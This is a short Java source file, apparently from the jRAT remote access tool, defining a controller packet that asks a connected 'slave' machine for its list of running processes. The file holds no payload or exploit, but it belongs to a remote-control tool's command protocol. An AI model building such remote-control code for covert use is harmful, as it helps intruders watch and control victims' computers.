package jrat.module.process;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class PacketQueryProcesses implements OutgoingPacket {
	
	private boolean icons;
	
	public PacketQueryProcesses() {
		this(false);
	}
	
	public PacketQueryProcesses(boolean icons) {
		this.icons = icons;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeBoolean(icons);
	}

	@Override
	public short getPacketId() {
		return 19;
	}

}
